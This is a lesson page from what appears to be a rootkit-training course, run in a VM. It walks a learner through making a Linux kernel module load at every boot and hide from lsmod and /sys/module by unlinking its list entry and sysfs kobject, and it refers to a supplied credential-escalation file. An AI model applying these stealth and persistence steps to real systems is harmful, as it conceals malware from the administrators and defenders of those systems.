# M00: Survive Reboot and Hide from `lsmod`

## Mission

L09 gives the module a command interface, but the module has two obvious limits:
a reboot removes it, and `lsmod` lists it by name.

Add four commands:

```text
rklings.persist     load rklings at the next boot
rklings.unpersist   stop loading it at boot
rklings.h.m         remove it from the module list
rklings.u.m         put it back
```

The module must remain active while hidden, and repeated hide or unhide commands
must be harmless.

## What you will observe

Persistence writes the configuration read during boot:

```console
root@victim:~# mkdir rklings.persist
root@victim:~# cat /etc/modules-load.d/rklings.conf
rklings
root@victim:~# reboot
root@victim:~# lsmod | grep '^rklings '
rklings                16384  0
```

Hiding removes the module from both kernel inventory surfaces:

```console
root@victim:~# mkdir rklings.h.m
root@victim:~# lsmod | grep '^rklings '
root@victim:~# ls /sys/module/rklings 2>&1
ls: cannot access '/sys/module/rklings': No such file or directory
root@victim:~# mkdir rklings.ping
root@victim:~# dmesg | tail -n 1
rklings: pong
root@victim:~# mkdir rklings.u.m
root@victim:~# lsmod | grep '^rklings '
rklings                16384  0
```

The `pong` log proves that hidden code is still running.

## Workspace

```text
exercises/M00-persistence-stealth
├── core
│   ├── cred.c
│   ├── dispatch.c
│   ├── init.c
│   └── module.c
├── include
│   └── rootkit.h
└── Kbuild
```

Only `core/module.c` is editable.
All four TODOs live there.

Supplied files:

- `core/cred.c`: PID-targeted credential escalation
- `core/dispatch.c`: mkdir interception and command dispatch
- `core/init.c`: module lifecycle and probe registration
- `include/rootkit.h`: constants and the command interface

## Make the next boot load the module

At boot, `systemd-modules-load` reads `/etc/modules-load.d/*.conf` and passes
each listed module name to `modprobe`.
For `rklings` to return after reboot, both of these must exist:

```text
/lib/modules/<kernel>/extra/rklings.ko     installed module
/etc/modules-load.d/rklings.conf           line containing: rklings
```

The validator installs and indexes the `.ko`.
Your `persist` command owns only the configuration file.

Kernel code does not use a userspace file descriptor:

```text
filp_open     open or create the file and return struct file *
kernel_write  write bytes through that kernel file object
filp_close    release the open file
```

`filp_open` reports failure as an error pointer, checked with `IS_ERR` and
decoded with `PTR_ERR`. `kernel_write` returns a negative error or the number of
bytes written.

## Hide from both kernel inventories

The kernel exposes loaded modules through two surfaces:

```text
/proc/modules      lsmod reads this (linked list walk)
/sys/module/       sysfs directory (kobject tree)
```

Removing only the linked list entry hides from `lsmod` but leaves a directory in
`/sys/module/` that any tool or analyst can find.
Both must go.

### `/proc/modules`: the module list

```text
before:  ... <-> previous <-> rklings <-> next <-> ...
hidden:  ... <-> previous <------------> next <-> ...
                         rklings still runs
```

`THIS_MODULE->list` is this module's node.
Before `list_del` removes it, save the previous node so `list_add` can restore
the same position later.

### `/sys/module/`: the sysfs entry

Each loaded module owns a kobject at `THIS_MODULE->mkobj.kobj`. `kobject_del`
removes it from the sysfs tree. `kobject_add` restores it, using the saved
parent and the module name.

Save `THIS_MODULE->mkobj.kobj.parent` before deleting.

### State tracking

The saved pointer records the current state:

```text
saved_prev == NULL    visible
saved_prev != NULL    hidden
```

Use that state to make repeated commands safe.
Unhide the module before unloading it so the normal module tools can find it.

> **Detection surfaces that remain.** Even after hiding from both inventories, a
> loaded module leaves traces: the kernel taint flag
> (`cat /proc/sys/kernel/tainted`), memory allocations visible to crash dumps,
> and `journalctl -k` logs from load time.
> These are addressed by later exercises, not here.

## TODOs

```text
TODO 1  core/module.c:16:2  hide the module from both inventories
TODO 2  core/module.c:21:2  restore the module to both inventories
TODO 3  core/module.c:28:2  write the boot configuration
TODO 4  core/module.c:34:2  clear the boot configuration
```

### TODO 1 -- `core/module.c:16:2` -- Hide the module from both inventories

If `saved_prev` is already set, return without changing anything.
Otherwise:

1. Save `THIS_MODULE->list.prev` in `saved_prev`.
2. Remove the module list entry with `list_del`.
3. Save the kobject parent from `THIS_MODULE->mkobj.kobj.parent` in
   `saved_parent`.
4. Remove the sysfs entry with `kobject_del`.

### TODO 2 -- `core/module.c:21:2` -- Restore the module to both inventories

If `saved_prev` is `NULL`, there is nothing to restore.
Otherwise:

1. Restore the sysfs entry with `kobject_add`, passing `saved_parent` and
   `MODULE_NAME_STR`.
2. Clear `saved_parent`.
3. Restore the module list entry with `list_add` after `saved_prev`.
4. Clear `saved_prev`.

Restore sysfs before the list so both surfaces return together.

### TODO 3 -- `core/module.c:28:2` -- Write the boot configuration

Open `PERSIST_PATH` with `O_WRONLY | O_CREAT | O_TRUNC` and mode `0644`.
Return `PTR_ERR(file)` if `filp_open` returns an error pointer.

Write `MODULE_NAME_STR "\n"` from offset zero, then close the file on every
write outcome.
Return the write error, return `-EIO` for a short write, or return `0` after the
complete write.

`MODULE_NAME_STR` is `"rklings"` (7 characters). `sizeof` includes the null
terminator, giving 8. The appended `"\n"` replaces that terminator, so the total
remains 8 bytes.

### TODO 4 -- `core/module.c:34:2` -- Clear the boot configuration

Open `PERSIST_PATH` with the same flags and mode. `O_TRUNC` makes the existing
file empty, so no write is needed.

Return the decoded open error on failure.
Otherwise close the file and return `0`.

## Test it

Start the exercise from the host:

```console
$ ./rklings run M00
```

Inside the guest, install the module where `modprobe` can find it, then enable
the boot entry:

```console
root@victim:~# insmod /rklings/rklings.ko
root@victim:~# install -D -m 0644 /rklings/rklings.ko \
> /lib/modules/$(uname -r)/extra/rklings.ko
root@victim:~# depmod -a
root@victim:~# mkdir rklings.persist
root@victim:~# cat /etc/modules-load.d/rklings.conf
rklings
```

Check visibility without rebooting:

```console
root@victim:~# mkdir rklings.h.m
root@victim:~# lsmod | grep '^rklings '
root@victim:~# ls /sys/module/rklings 2>&1
ls: cannot access '/sys/module/rklings': No such file or directory
root@victim:~# mkdir rklings.u.m
root@victim:~# lsmod | grep '^rklings '
rklings                16384  0
root@victim:~# ls /sys/module/rklings
coresize  holders  initsize  initstate  notes
refcnt  sections  srcversion  taint  uevent
```

Use validation for the reboot test; it preserves one VM across both reboots and
cleans up the installed module afterward.

## Validate


```console
$ ./rklings validate M00
  [+] mkdir rklings.persist creates /etc/modules-load.d/rklings.conf
  [+] Module loads automatically after a real reboot
  [+] mkdir rklings.unpersist clears the autoload file
  [+] Module remains absent after unpersist and reboot
  [+] rklings.e still works
  [+] mkdir rklings.h.m hides from lsmod and /sys/module
  [+] mkdir rklings.u.m restores in lsmod and /sys/module
  [+] Repeated hide and unhide do not corrupt the module list
  PASS
```


## Next

The module can return after reboot and disappear from both kernel inventories.
L10 adds the target lists needed to choose which files, processes, text, and
ports later filters will conceal.
